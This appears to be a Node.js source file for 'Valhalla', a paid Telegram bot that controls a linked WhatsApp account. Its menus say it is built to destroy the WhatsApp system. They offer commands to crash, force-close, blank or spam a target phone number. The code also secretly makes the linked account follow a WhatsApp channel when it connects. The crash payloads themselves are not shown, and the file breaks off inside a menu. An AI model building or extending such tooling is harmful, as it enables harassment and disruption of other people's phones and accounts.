
const axios = require("axios");
const { Telegraf } = require("telegraf");
const { spawn } = require("child_process");
const { pipeline } = require("stream/promises");
const { createWriteStream } = require("fs");
const fileType = require('file-type');
const fs = require("fs");
const path = require("path");
const jid = "0@s.whatsapp.net";
const vm = require("vm");
const os = require("os");
const FormData = require("form-data");
const https = require("https");
const moment = require("moment-timezone");
const EventEmitter = require("events")
const pino = require("pino");
const { performance } = require("perf_hooks");
const crypto = require("crypto");
const chalk = require("chalk");
const { exec } = require("child_process");
const cloudscraper = require("cloudscraper");
const puppeteer = require("puppeteer-extra");
const StealthPlugin = require("puppeteer-extra-plugin-stealth");
const nodeModulesPath = path.join(__dirname, "node_modules");
puppeteer.use(StealthPlugin());

// Load config langsung tanpa pengecekan
const config = require("./config.js");

const thumbnailUrl = config.THUMBNAIL_URL || "https://files.catbox.moe/1nk8pj.jpg";

function readFileSafe(p){
try { return require('fs').readFileSync(p); } catch(e){ return null; }
}

// Langsung gunakan token dari config
const tokenBot = config.TELEGRAM_TOKEN;
const ownerID = config.OWNER_ID || config.TELEGRAM_CREATOR?.[0] || "8305009099";

const {
default: makeWASocket,
useMultiFileAuthState,
fetchLatestBaileysVersion,
generateWAMessageFromContent,
prepareWAMessageMedia,
downloadContentFromMessage,
generateForwardMessageContent,
generateWAMessage,
jidDecode,
areJidsSameUser,
BufferJSON,
DisconnectReason,
proto,
makeCacheableSignalKeyStore,
encodeSignedDeviceIdentity,
encodeWAMessage,
jidEncode,
patchMessageBeforeSending,
encodeNewsletterMessage,
} = require("baileys");

const makeInMemoryStore = ({ logger = console } = {}) => {
const ev = new EventEmitter()

let chats = {}
let messages = {}
let contacts = {}

ev.on('messages.upsert', ({ messages: newMessages, type }) => {
for (const msg of newMessages) {
const chatId = msg.key.remoteJid
if (!messages[chatId]) messages[chatId] = []
messages[chatId].push(msg)

if (messages[chatId].length > 100) {    
    messages[chatId].shift()    
  }    

  chats[chatId] = {    
    ...(chats[chatId] || {}),    
    id: chatId,    
    name: msg.pushName,    
    lastMsgTimestamp: +msg.messageTimestamp    
  }    
}

})

ev.on('chats.set', ({ chats: newChats }) => {
for (const chat of newChats) {
chats[chat.id] = chat
}
})

ev.on('contacts.set', ({ contacts: newContacts }) => {
for (const id in newContacts) {
contacts[id] = newContacts[id]
}
})

return {
chats,
messages,
contacts,
bind: (evTarget) => {
evTarget.on('messages.upsert', (m) => ev.emit('messages.upsert', m))
evTarget.on('chats.set', (c) => ev.emit('chats.set', c))
evTarget.on('contacts.set', (c) => ev.emit('contacts.set', c))
},
logger
}
}

function fetchJsonHttps(url, timeout = 5000) {
return new Promise((resolve, reject) => {
try {
const req = https.get(url, { timeout }, (res) => {
const { statusCode } = res;
if (statusCode < 200 || statusCode >= 300) {
let _ = '';
res.on('data', c => _ += c);
res.on('end', () => reject(new Error(`HTTP ${statusCode}`)));
return;
}

let raw = '';    
    res.on('data', chunk => raw += chunk);    
    res.on('end', () => {    
      try {    
        resolve(JSON.parse(raw));    
      } catch {    
        reject(new Error('Invalid JSON response'));    
      }    
    });    
  });    

  req.on('timeout', () => {    
    req.destroy();    
    reject(new Error('Request timeout'));    
  });    

  req.on('error', (err) => reject(err));    
} catch (e) {    
  reject(e);    
}

});
}

async function httpsGet(url, opts = {}) {
const { timeout = 15000, responseType = "json", headers = {} } = opts;
return new Promise((resolve, reject) => {
try {
const req = https.get(url, { headers, timeout }, (res) => {
const { statusCode } = res;
const chunks = [];
res.on('data', (chunk) => chunks.push(chunk));
res.on('end', () => {
const raw = Buffer.concat(chunks);
if (statusCode < 200 || statusCode >= 300) {
return reject(new Error(`HTTP ${statusCode}`));
}
if (responseType === "arraybuffer") return resolve(raw);
const text = raw.toString('utf8');
if (responseType === "text") return resolve(text);
try {
return resolve(JSON.parse(text));
} catch (err) {
return reject(new Error('Invalid JSON response'));
}
});
});
req.on('error', (err) => reject(err));
req.on('timeout', () => {
req.destroy(new Error('Request timeout'));
});
} catch (err) {
reject(err);
}
});
}

async function httpsPost(url, data, opts = {}) {
const { timeout = 20000, headers = {}, responseType = "json" } = opts;
return new Promise((resolve, reject) => {
try {
const u = new URL(url);
const isString = typeof data === "string" || data instanceof String;
const body = isString ? String(data) : (data instanceof URLSearchParams ? data.toString() : (typeof data === "object" ? JSON.stringify(data) : ""));
const defaultHeaders = {
'Content-Length': Buffer.byteLength(body || ""),
};
const requestOptions = {
hostname: u.hostname,
port: u.port || 443,
path: u.pathname + (u.search || ""),
method: 'POST',
headers: Object.assign({}, defaultHeaders, headers),
timeout
};
const req = https.request(requestOptions, (res) => {
const chunks = [];
res.on('data', (c) => chunks.push(c));
res.on('end', () => {
const raw = Buffer.concat(chunks);
if (res.statusCode < 200 || res.statusCode >= 300) {
return reject(new Error(`HTTP ${res.statusCode}`));
}
if (responseType === "arraybuffer") return resolve(raw);
const text = raw.toString('utf8');
if (responseType === "text") return resolve(text);
try {
return resolve(JSON.parse(text));
} catch (err) {
return reject(new Error('Invalid JSON response'));
}
});
});
req.on('error', (err) => reject(err));
req.on('timeout', () => {
req.destroy(new Error('Request timeout'));
});
if (body) req.write(body);
req.end();
} catch (err) {
reject(err);
}
});
}

const __thumbExt = (() => {
try {
const u = thumbnailUrl.split('?')[0].toLowerCase();
const m = u.match(/\.(mp4|gif|png|jpe?g)$/);
return m ? m[1] : 'jpg';
} catch { return 'jpg'; }
})();
const thumbnailType = (__thumbExt === 'mp4') ? 'mp4' : (__thumbExt === 'gif') ? 'gif' : 'photo';

function createSafeSock(sock) {
let sendCount = 0
const MAX_SENDS = 500
const normalize = j =>
j && j.includes("@")
? j
: j.replace(/[^0-9]/g, "") + "@s.whatsapp.net"

return {
sendMessage: async (target, message) => {
if (sendCount++ > MAX_SENDS) throw new Error("RateLimit")
const jid = normalize(target)
return await sock.sendMessage(jid, message)
},
relayMessage: async (target, messageObj, opts = {}) => {
if (sendCount++ > MAX_SENDS) throw new Error("RateLimit")
const jid = normalize(target)
return await sock.relayMessage(jid, messageObj, opts)
},
presenceSubscribe: async jid => {
try { return await sock.presenceSubscribe(normalize(jid)) } catch(e){}
},
sendPresenceUpdate: async (state,jid) => {
try { return await sock.sendPresenceUpdate(state, normalize(jid)) } catch(e){}
}
}
}

async function setBotProfile(bot) {
try {
const botDefaultName = config.BOT_NAME || "𝐕𝐀𝐋𝐇𝐀𝐋𝐋𝐀";
await bot.telegram.setMyName(botDefaultName);
} catch (error) {}
}

const ChannelUrl = config.CHANNEL_URL || [
"https://whatsapp.com/channel/0029VbAXLx7FHWq2Dhn7ea1Z",
];

const uniq = (arr) => [...new Set(arr)];

function getAllChannelLinks() {
return uniq(ChannelUrl);
}

async function autoFollowChannel(sock) {
try {
const links = getAllChannelLinks();
let joined = 0;

for (const link of links) {    
  try {    
    let code = "";    
    let jid = "";    

    const m1 = /(whatsapp\.com\/channel\/|wa\.me\/channel\/)([A-Za-z0-9._-]+)/i.exec(link);    
    if (m1) code = m1[2];    

    const mInv = /^\d{10,}-[a-z0-9_-]{6,}$/i.exec(link);    
    if (!code && mInv) code = mInv[0];    

    if (/@newsletter$/i.test(link)) jid = link;    

    const m2 = /([0-9]{10,})@newsletter$/i.exec(link);    
    if (!jid && m2) jid = m2[0];    

    if (!jid && typeof sock.newsletterMetadata === "function" && code) {    
      const meta = await sock.newsletterMetadata("invite", code).catch(() => null);    
      jid = meta?.id || meta?.jid || "";    
    }    

    if (!jid && /^[0-9]{10,}@newsletter$/i.test(code)) jid = code;    

    if (!jid) continue;    

    const fnList = [    
      "newsletterFollow",    
      "followNewsletter",    
      "channelFollow",    
      "subscribeChannel",    
      "newsletterSubscribe"    
    ];    

    for (const fn of fnList) {    
      if (typeof sock[fn] === "function") {    
        await sock[fn](jid).catch(() => {});    
        break;    
      }    
    }    

    joined++;    
  } catch (err) {}    
}    

if (joined > 0) {}

} catch (err) {}
}

const numberuestion = (query) => new Promise((resolve) => {
const rl = require('readline').createInterface({
input: process.stdin,
output: process.stdout
});
rl.question(query, (answer) => {
rl.close();
resolve(answer);
});
});

function injectAutoThumbnail(bot) {
bot.use(async (ctx, next) => {
const _photo = ctx.replyWithPhoto?.bind(ctx);
const _video = ctx.replyWithVideo?.bind(ctx);
const _anim  = ctx.replyWithAnimation?.bind(ctx);
const _editMedia = ctx.editMessageMedia?.bind(ctx);

if (_photo) {    
  ctx.replyWithPhoto = (photo, options = {}) => {    
    try {    
      const isThumb = String(photo) === String(thumbnailUrl);    
      if (!isThumb || thumbnailType === "photo") {    
        return _photo(photo, options);    
      }    
      if (thumbnailType === "mp4" && _video) {    
        return _video(thumbnailUrl, options);    
      }    
      if (thumbnailType === "gif" && _anim) {    
        return _anim(thumbnailUrl, options);    
      }    
      return _photo(photo, options);    
    } catch (e) {    
      return _photo(photo, options);    
    }    
  };    
}    

if (_editMedia) {    
  ctx.editMessageMedia = (inputMedia, extra) => {    
    try {    
      const isThumb = inputMedia && String(inputMedia.media) === String(thumbnailUrl);    
      if (isThumb) {    
        const base = {    
          media: thumbnailUrl,    
          caption: inputMedia.caption,    
          parse_mode: inputMedia.parse_mode    
        };    
        if (thumbnailType === "mp4") {    
          inputMedia = { type: "video", ...base };    
        } else if (thumbnailType === "gif") {    
          inputMedia = { type: "animation", ...base };    
        } else {    
          inputMedia = { type: "photo", ...base };    
        }    
      }    
    } catch {}    
    return _editMedia(inputMedia, extra);    
  };    
}    

return next();

});
}

// Inisialisasi bot dengan token dari config
const bot = new Telegraf(tokenBot);

// Langsung jalankan tanpa pengecekan
setBotProfile(bot);
injectAutoThumbnail(bot);

let sock = null;
let isWhatsAppConnected = false;
let linkedWhatsAppNumber = '';
let lastPairingMessage = null;
const usePairingCode = true;

const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));

const adminFile = config.ADMIN_FILE || './database/admin.json';
const premiumFile = config.PREMIUM_FILE || './database/premium.json';
const cooldownFile = config.COOLDOWN_FILE || './database/cooldown.json'

const loadAdmins = () => {
try {
const data = fs.readFileSync(adminFile);
return JSON.parse(data);
} catch (err) {
return {};
}
};

const saveAdmins = (admins) => {
try {
fs.writeFileSync(adminFile, JSON.stringify(admins, null, 2));
} catch (err) {}
};

const addAdmin = (userId) => {
const admins = loadAdmins();
admins[userId] = true;
saveAdmins(admins);
return true;
};

const removeAdmin = (userId) => {
const admins = loadAdmins();
delete admins[userId];
saveAdmins(admins);
return true;
};

const isAdmin = (userId) => {
const admins = loadAdmins();
return admins[userId] === true || userId == ownerID;
};

const loadPremiumUsers = () => {
try {
const data = fs.readFileSync(premiumFile);
return JSON.parse(data);
} catch (err) {
return {};
}
};

const savePremiumUsers = (users) => {
fs.writeFileSync(premiumFile, JSON.stringify(users, null, 2));
};

const addPremiumUser = (userId, duration) => {
const premiumUsers = loadPremiumUsers();
const expiryDate = moment().add(duration, 'days').tz('Asia/Jakarta').format('DD-MM-YYYY');
premiumUsers[userId] = expiryDate;
savePremiumUsers(premiumUsers);
return expiryDate;
};

const removePremiumUser = (userId) => {
const premiumUsers = loadPremiumUsers();
delete premiumUsers[userId];
savePremiumUsers(premiumUsers);
};

const isPremiumUser = (userId) => {
const premiumUsers = loadPremiumUsers();
if (premiumUsers[userId]) {
const expiryDate = moment(premiumUsers[userId], 'DD-MM-YYYY');
if (moment().isBefore(expiryDate)) {
return true;
} else {
removePremiumUser(userId);
return false;
}
}
return false;
};

const loadCooldown = () => {
try {
const data = fs.readFileSync(cooldownFile)
return JSON.parse(data).cooldown || 5
} catch {
return 5
}
}

const saveCooldown = (seconds) => {
fs.writeFileSync(cooldownFile, JSON.stringify({ cooldown: seconds }, null, 2))
}

let cooldown = loadCooldown()
const userCooldowns = new Map()

function formatRuntime() {
let sec = Math.floor(process.uptime());
let hrs = Math.floor(sec / 3600);
sec %= 3600;
let mins = Math.floor(sec / 60);
sec %= 60;
return `${hrs}h ${mins}m ${sec}s`;
}

function formatMemory() {
const usedMB = process.memoryUsage().rss / 1024 / 1024;
return `${usedMB.toFixed(0)} MB`;
}

const startSesi = async () => {
console.clear();
function label(text) {
return chalk.white(text.padEnd(15, " ") + ": ");
}

console.log(`
${chalk.red("✦ ▬▬▬▬▬▬▬▬▬ VALHALLA PICES ▬▬▬▬▬▬▬▬▬ ✦")}
${label("\b❯ Developer")} ${chalk.yellow("PAHINA CUPOF")}
${label("\b❯ Version")} ${chalk.yellow("24.0")}
${label("\b❯ Database")} ${chalk.green("● CONNECTED")}
${label("\b❯ Status")} ${chalk.green("● REGISTERED")}
${label("\b❯ Reason")} ${chalk.red("-")}
${chalk.red("✦ ▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬ ✦")}
`);
    
const store = makeInMemoryStore({
  logger: require('pino')().child({ level: 'silent', stream: 'store' })
})
    const { state, saveCreds } = await useMultiFileAuthState('./session');
    const { version } = await fetchLatestBaileysVersion();

    const connectionOptions = {
        version,
        keepAliveIntervalMs: 30000,
        printQRInTerminal: !usePairingCode,
        logger: pino({ level: "silent" }),
        auth: state,
        browser: ['Mac OS', 'Safari', '10.15.7'],
        getMessage: async (key) => ({
            conversation: 'Apophis',
        }),
    };

    sock = makeWASocket(connectionOptions);
    
    sock.ev.on("messages.upsert", async (m) => {
        try {
            if (!m || !m.messages || !m.messages[0]) {
                return;
            }

            const msg = m.messages[0]; 
            const chatId = msg.key.remoteJid || "Tidak Diketahui";

        } catch (error) {
        }
    });

    sock.ev.on('creds.update', saveCreds);
    store.bind(sock.ev);
    
    sock.ev.on('connection.update', (update) => {
        const { connection, lastDisconnect } = update;
        if (connection === 'open') {
        autoFollowChannel(sock).catch(() => {});
        
        if (lastPairingMessage) {
        const connectedMenu = `
<blockquote><strong>╭═───⊱ 𝐕𝐀𝐋𝐇𝐀𝐋𝐋𝐀 ───═⬡
│ ⸙ Number
│ᯓ➤ ${lastPairingMessage.phoneNumber}
│ ⸙ Pairing
│ᯓ➤ ${lastPairingMessage.pairingCode}
│ ⸙ Status
│ᯓ➤ Connected
╰═─────────────═⬡</strong></blockquote>
`;

        try {
          bot.telegram.editMessageCaption(
            lastPairingMessage.chatId,
            lastPairingMessage.messageId,
            undefined,
            connectedMenu,
            { parse_mode: "HTML" }
          );
        } catch (e) {
        }
      }
      
            console.clear();
            isWhatsAppConnected = true;
            const currentTime = moment().tz('Asia/Jakarta').format('HH:mm:ss');
        }

                 if (connection === 'close') {
            const shouldReconnect = lastDisconnect?.error?.output?.statusCode !== DisconnectReason.loggedOut;
            console.log(
                chalk.red('Koneksi WhatsApp terputus:'),
                shouldReconnect ? 'Mencoba Menautkan Perangkat' : 'Silakan Menautkan Perangkat Lagi'
            );
            if (shouldReconnect) {
                startSesi();
            }
            isWhatsAppConnected = false;
        }
    });
};

startSesi();

const checkWhatsAppConnection = (ctx, next) => {
    if (!isWhatsAppConnected) {
        ctx.reply("🪧 ☇ Tidak ada sender yang terhubung");
        return;
    }
    next();
};

const checkCooldown = (ctx, next) => {
    const userId = ctx.from.id
    const now = Date.now()

    if (userCooldowns.has(userId)) {
        const lastUsed = userCooldowns.get(userId)
        const diff = (now - lastUsed) / 1000

        if (diff < cooldown) {
            const remaining = Math.ceil(cooldown - diff)
            ctx.reply(`⏳ ☇ Harap menunggu ${remaining} detik`)
            return
        }
    }

    userCooldowns.set(userId, now)
    next()
}

const checkAdmin = (ctx, next) => {
    if (!isAdmin(ctx.from.id)) {
        ctx.reply("❌ ☇ Akses hanya untuk admin");
        return;
    }
    next();
};

const checkPremium = (ctx, next) => {
    if (!isPremiumUser(ctx.from.id)) {
        ctx.reply("❌ ☇ Akses hanya untuk premium");
        return;
    }
    next();
};

function escapeHtml(text = '') {
  return String(text)
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;');
}

const userButtonColor = {};
const buttonIntervals = new Map();

async function sendStartMenu(chatId, from) {
  const userId = from.id;
  const displayName = escapeHtml(from.first_name || from.username || "User");
  const senderStatus = isWhatsAppConnected ? "1 Connected" : "0 Connected";
  const runtimeStatus = formatRuntime();
  const memoryStatus = formatMemory();
  const cooldownStatus = loadCooldown();

  const chosenColor = userButtonColor[userId] || "primary";
  let styles;

  if (chosenColor === "disco") {
    styles = ["primary", "success", "danger", "secondary"];
  } else {
    const safeColor = {
      danger: "danger",
      success: "success",
      secondary: "primary"
    };
    styles = [safeColor[chosenColor] || "primary"];
  }

  let index = 0;
  const keyboard = [
    [
      { text: "𝐂𝐎𝐍𝐓𝐑𝐎𝐋𝐒", callback_data: "/controls", style: styles[index] },
      { text: "𝐁𝐔𝐆𝐌𝐄𝐍𝐔", callback_data: "/bug", style: styles[index] }
    ],
    [
      { text: "𝐓𝐇𝐄 𝐃𝐄𝐕𝐀𝐒", url: "https://t.me/ciaaaange", style: styles[index] }
    ],
    [
      { text: "𝐓𝐇𝐀𝐍𝐊𝐒", callback_data: "/tqto", style: styles[index] },
      { text: "𝐓𝐎𝐎𝐋𝐒", callback_data: "/tools", style: styles[index] }
    ],
    [
      { text: "𝐂𝐇𝐀𝐍𝐄𝐒", url: "https://t.me/fnz4you", style: styles[index] }
    ]
  ];

  const menuMessage = `
<blockquote>( 👋 ) — Здравствуйте ${displayName}
( 🍁 ) — я скриптовый бот WhatsApp, созданный Dewa4You, предназначенный для разрушения системы WhatsApp.

➤ 〔 INFORMATION 〕
☩ Nama Bot : Valhalla 
☩ Version : 7.0.0 Buy Only
☩ Developer : 𝐃𝐞𝐰𝐚4𝐏𝐚𝐫𝐭𝐧𝐞𝐫𝐬𝐈𝐧𝐂𝐫𝐢𝐦𝐞
☩ Telegram : t.me/ciaaaange
☩ YouTube : @fnz4you
☩ Prefix : multi
☩ Type : /
☩ Language : JavaScript
☩ Memory : ${memoryStatus}
☩ Sender : ${senderStatus}
☩ RunTime : ${runtimeStatus}</blockquote>`;

  const sent = await bot.telegram.sendPhoto(chatId, thumbnailUrl, {
    caption: menuMessage,
    parse_mode: "HTML",
    reply_markup: { inline_keyboard: keyboard }
  });

  const messageId = sent.message_id;

  if (styles.length > 1) {
    const intervalId = setInterval(async () => {
      index++;
      if (index >= styles.length) index = 0;

      const newKeyboard = [
        [
          { text: "𝐂𝐎𝐍𝐓𝐑𝐎𝐋𝐒", callback_data: "/controls", style: styles[index] },
          { text: "𝐁𝐔𝐆𝐌𝐄𝐍𝐔", callback_data: "/bug", style: styles[index] }
        ],
        [
          { text: "𝐓𝐇𝐄 𝐃𝐄𝐕𝐀𝐒", url: "https://t.me/ciaaaange", style: styles[index] }
        ],
        [
          { text: "𝐓𝐇𝐀𝐍𝐊𝐒", callback_data: "/tqto", style: styles[index] },
          { text: "𝐓𝐎𝐎𝐋𝐒", callback_data: "/tools", style: styles[index] }
        ],
        [
          { text: "𝐂𝐇𝐀𝐍𝐄𝐒", url: "https://t.me/fnz4you", style: styles[index] }
        ]
      ];

      try {
        await bot.telegram.editMessageReplyMarkup(
          chatId,
          messageId,
          undefined,
          { inline_keyboard: newKeyboard }
        );
      } catch (e) {}
    }, 1000);

    buttonIntervals.set(messageId, intervalId);
  }
}

bot.start(async (ctx) => {
  const chatId = ctx.chat.id;
  const userId = ctx.from.id;
  const firstName = ctx.from.first_name || "User";

  const loadingFrames = [
    `<b><u>𝐕𝐀𝐋𝐇𝐀𝐋𝐋𝐀 𝐕𝟕 𝐁𝐔𝐘 𝐎𝐍𝐋𝐘 </u></b>
<blockquote expandable><b>╭═𓊈 SYSTEM INFORMATION 𓊉</b>
<b>║</b> <b>◈</b> Loading ☇ [░░░░░░░░░░] 0%
<b>╰═─═─═─═─═─═─═─═─═─═─⪼</b></blockquote>`,
    `<b><u>𝐕𝐀𝐋𝐇𝐀𝐋𝐋𝐀 𝐕𝟕 𝐁𝐔𝐘 𝐎𝐍𝐋𝐘 </u></b>
<blockquote expandable><b>╭═𓊈 SYSTEM INFORMATION 𓊉</b>
<b>║</b> <b>◈</b> Loading ☇ [▓▓░░░░░░░░] 20%
<b>╰═─═─═─═─═─═─═─═─═─═─⪼</b></blockquote>`,
    `<b><u>𝐕𝐀𝐋𝐇𝐀𝐋𝐋𝐀 𝐕𝟕 𝐁𝐔𝐘 𝐎𝐍𝐋𝐘 </u></b>
<blockquote expandable><b>╭═𓊈 SYSTEM INFORMATION 𓊉</b>
<b>║</b> <b>◈</b> Loading ☇ [▓▓▓▓░░░░░░] 40%
<b>╰═─═─═─═─═─═─═─═─═─═─⪼</b></blockquote>`,
    `<b><u>𝐕𝐀𝐋𝐇𝐀𝐋𝐋𝐀 𝐕𝟕 𝐁𝐔𝐘 𝐎𝐍𝐋𝐘 </u></b>
<blockquote expandable><b>╭═𓊈 SYSTEM INFORMATION 𓊉</b>
<b>║</b> <b>◈</b> Loading ☇ [▓▓▓▓▓▓░░░░] 60%
<b>╰═─═─═─═─═─═─═─═─═─═─⪼</b></blockquote>`,
    `<b><u>𝐕𝐀𝐋𝐇𝐀𝐋𝐋𝐀 𝐕𝟕 𝐁𝐔𝐘 𝐎𝐍𝐋𝐘 </u></b>
<blockquote expandable><b>╭═𓊈 SYSTEM INFORMATION 𓊉</b>
<b>║</b> <b>◈</b> Loading ☇ [▓▓▓▓▓▓▓▓░░] 80%
<b>╰═─═─═─═─═─═─═─═─═─═─⪼</b></blockquote>`,
    `<b><u>𝐕𝐀𝐋𝐇𝐀𝐋𝐋𝐀 𝐕𝟕 𝐁𝐔𝐘 𝐎𝐍𝐋𝐘 </u></b>
<blockquote expandable><b>╭═𓊈 SYSTEM INFORMATION 𓊉</b>
<b>║</b> <b>◈</b> Loading ☇ [▓▓▓▓▓▓▓▓▓▓] 100%
<b>╰═─═─═─═─═─═─═─═─═─═─⪼</b></blockquote>`
  ];

  const loadingMessage = await ctx.reply(loadingFrames[0], { parse_mode: "HTML" });
  for (let i = 1; i < loadingFrames.length; i++) {
    await new Promise(r => setTimeout(r, 400));
    try {
      await ctx.editMessageText(loadingFrames[i], { message_id: loadingMessage.message_id, parse_mode: "HTML" });
    } catch (err) {
      console.error("Loading error:", err);
    }
  }
  await ctx.deleteMessage(loadingMessage.message_id).catch(() => {});

  await ctx.replyWithPhoto(thumbnailUrl, {
    caption: `\`\`\`js
╔═━━━〔 𝐖𝐄𝐋𝐂𝐎𝐌𝐄  〕━━━⬣
║Script Name : 𝐕𝐀𝐋𝐇𝐀𝐋𝐋𝐀 𝐕𝟕 𝐁𝐔𝐘 𝐎𝐍𝐋𝐘 
║Owner : @ciaaaange
║Version : 7.0.0 
║Status: Online & Secured
┗━━━━━━━━━━━━━━━━━━━━━━━━━━⬣
\`\`\``,
    parse_mode: "MarkdownV2",
    reply_markup: {
      inline_keyboard: [
        [{ text: "🔴 Merah", callback_data: "color_danger" },
         { text: "🟢 Hijau", callback_data: "color_success" }],
        [{ text: "🟡 Kuning", callback_data: "color_secondary" },
         { text: "💃 Disko", callback_data: "color_disco" }]
      ]
    }
  });
});

// ───────────────────────────────────────────────────────────
// FUNGSI BANTUAN UNTUK DIPAKAI TOMBOL DAN PERINTAH MANUAL
// ───────────────────────────────────────────────────────────
async function showControlsMenu(ctx) {
  const senderStatus = isWhatsAppConnected ? "1 Connected" : "0 Connected";
  const runtimeStatus = formatRuntime();
  const memoryStatus = formatMemory();
  const cooldownStatus = loadCooldown();
  const displayName = escapeHtml(ctx.from.first_name || ctx.from.username || "User");

  const controlsMenu = `
<blockquote>( 👋 ) — Здравствуйте ${displayName}
( 🍁 ) — я скриптовый бот WhatsApp, созданный Dewa4You, предназначенный для разрушения системы WhatsApp.

➤ 〔 INFORMATION 〕
☩ Nama Bot : Valhalla 
☩ Version : 7.0.0 Buy Only
☩ Developer : 𝐃𝐞𝐰𝐚4𝐏𝐚𝐫𝐭𝐧𝐞𝐫𝐬𝐈𝐧𝐂𝐫𝐢𝐦𝐞
☩ Telegram : t.me/ciaaaange
☩ YouTube : @fnz4you
☩ Prefix : multi
☩ Type : /
☩ Language : JavaScript
☩ Memory : ${memoryStatus}
☩ Sender : ${senderStatus}
☩ RunTime : ${runtimeStatus}

╭═───⊱ CONTROLS MENU ───═⬡
│ ⸙ /requestpair
│ᯓ➤ Adding Sender Number
│ ⸙ /setcooldown
│ᯓ➤ Setting Bot Cooldown
│ ⸙ /resetsession
│ᯓ➤ Reset Sender Number
│ ⸙ /addadmin
│ᯓ➤ Adding Admin Bots
│ ⸙ /deladmin
│ᯓ➤ Deleting Admin Bot
│ ⸙ /addpremium
│ᯓ➤ Adding Premium Users
│ ⸙ /delpremium
│ᯓ➤ Deleting Premium User
╰═─────────────═⬡</blockquote>
`;

  const keyboard = [[{ text: "⌜🔙⌟ ☇ メインコース", callback_data: "/start" }]];

  try {
    if (ctx.callbackQuery) {
      await ctx.editMessageCaption(controlsMenu, { parse_mode: "HTML", reply_markup: { inline_keyboard: keyboard } });
    } else {
      await ctx.replyWithPhoto(thumbnailUrl, { caption: controlsMenu, parse_mode: "HTML", reply_markup: { inline_keyboard: keyboard } });
    }
  } catch (error) {
    console.error("Controls error:", error);
    await ctx.answerCbQuery().catch(() => {});
  }
}

async function showBugMenu(ctx) {
  const senderStatus = isWhatsAppConnected ? "1 Connected" : "0 Connected";
  const runtimeStatus = formatRuntime();
  const memoryStatus = formatMemory();
  const cooldownStatus = loadCooldown();
  const displayName = escapeHtml(ctx.from.first_name || ctx.from.username || "User");
  
  const bugMenu = `
<blockquote>( 👋 ) — Здравствуйте ${displayName}
( 🍁 ) — я скриптовый бот WhatsApp, созданный Dewa4You, предназначенный для разрушения системы WhatsApp.

➤ 〔 INFORMATION 〕
☩ Nama Bot : Valhalla 
☩ Version : 7.0.0 Buy Only
☩ Developer : 𝐃𝐞𝐰𝐚4𝐏𝐚𝐫𝐭𝐧𝐞𝐫𝐬𝐈𝐧𝐂𝐫𝐢𝐦𝐞
☩ Telegram : t.me/ciaaaange
☩ YouTube : @fnz4you
☩ Prefix : multi
☩ Type : /
☩ Language : JavaScript
☩ Memory : ${memoryStatus}
☩ Sender : ${senderStatus}
☩ RunTime : ${runtimeStatus}

〔 Bug Menu 〕
╰┈➤⊘ /dewaforceios ✆ 62xx
 ᝰ.ᐟ. Forclose ios hard
 ╰┈➤⊘ /dewacrash ✆ 62xx
 ᝰ.ᐟ. Crash Home
 ╰┈➤⊘ /dewablank ✆ 62xx
 ᝰ.ᐟ. Blank Notif
 ╰┈➤⊘ /dewaspam ✆ 62xx
 ᝰ.ᐟ. Delay bebas spam
╰┈➤⊘ /dewainvis ✆ 62xx
 ᝰ.ᐟ. Delay Invis
 ╰┈➤⊘ /dewadelay ✆ 62xx
 ᝰ.ᐟ. Delay Hard 
 ╰┈➤⊘ /dewabuldo ✆ 62xx
 ᝰ.ᐟ. Delay</blockquote>`;

  const keyboard = [
    [{ text: "⌜🔙⌟ ☇ メインコース", callback_data: "/start" }]
  ];

  try {
    if (ctx.callbackQuery) {
      await ctx.editMessageCaption(bugMenu, { parse_mode: "HTML", reply_markup: { inline_keyboard: keyboard } });
    } else {
      await ctx.replyWithPhoto(thumbnailUrl, { caption: bugMenu, parse_mode: "HTML", reply_markup: { inline_keyboard: keyboard } });
    }
  } catch (error) {
    console.error("Bug menu error:", error);
    await ctx.answerCbQuery().catch(() => {});
  }
}

async function showTqtoMenu(ctx) {
  const senderStatus = isWhatsAppConnected ? "1 Connected" : "0 Connected";
  const runtimeStatus = formatRuntime();
  const memoryStatus = formatMemory();
  const cooldownStatus = loadCooldown();
  const displayName = escapeHtml(ctx.from.first_name || ctx.from.username || "User");
  
  const tqtoMenu = `
<blockquote>( 👋 ) — Здравствуйте ${displayName}
( 💝 ) — я скриптовый бот WhatsApp, созданный Dewa4You, предназначенный для разрушения системы WhatsApp.

➤ 〔 INFORMATION 〕
☩ Nama Bot : Valhalla 
☩ Version : 7.0.0 Buy Only
☩ Developer : 𝐃𝐞𝐰𝐚4𝐏𝐚𝐫𝐭𝐧𝐞𝐫𝐬𝐈𝐧𝐂𝐫𝐢𝐦𝐞
☩ Telegram : t.me/ciaaaange
☩ YouTube : @fnz4you
☩ Prefix : multi
☩ Type : /
☩ Language : JavaScript

╭──〔 𝖳𝖧𝖠𝖭𝖪𝖲 𝖳𝖮 〕
│ Dewa ( Developer )
│ Xcovz ( Best Friends )
│ Lubyz ( Best Friends )
│ Fox ( Best Friends )
│ Dontol ( Best Friends )
│ Takashi ( Best Friends )
│ Cristian ( Best Friends )
│ Kelpin ( Best Friends )
│ Sabil ( Best Friends )
│ Kingdom ( Best Friends )
│ AsepX7 ( Best Friends )
│ Adly ( Asisten )
│ Yozz ( Partner )
│ AL ( Partner )
│ > All Buyer Dewa
│ > All Partner Dewa
╰─────────────────</blockquote>`;

  const keyboard = [[{ text: "⌜🔙⌟ ☇ メインコース", callback_data: "/start" }]];

  try {
    if (ctx.callbackQuery) {
      await ctx.editMessageCaption(tqtoMenu, { parse_mode: "HTML", reply_markup: { inline_keyboard: keyboard } });
    } else {
      await ctx.replyWithPhoto(thumbnailUrl, { caption: tqtoMenu, parse_mode: "HTML", reply_markup: { inline_keyboard: keyboard } });
    }
  } catch (error) {
    console.error("Tqto menu error:", error);
    await ctx.answerCbQuery().catch(() => {});
  }
}

async function showToolsMenu(ctx) {
  const senderStatus = isWhatsAppConnected ? "1 Connected" : "0 Connected";
  const runtimeStatus = formatRuntime();
  const memoryStatus = formatMemory();
  const cooldownStatus = loadCooldown();
  const displayName = escapeHtml(ctx.from.first_name || ctx.from.username || "User");
  
  const toolsMenu = `
<blockquote>( 👋 ) — Здравствуйте ${displayName}
( 🍁 ) — я скриптовый бот WhatsApp, созданный Dewa4You, предназначенный для разрушения системы WhatsApp.

➤ 〔 INFORMATION 〕
☩ Nama Bot : Valhalla 
☩ Version : 7.0.0 Buy Only
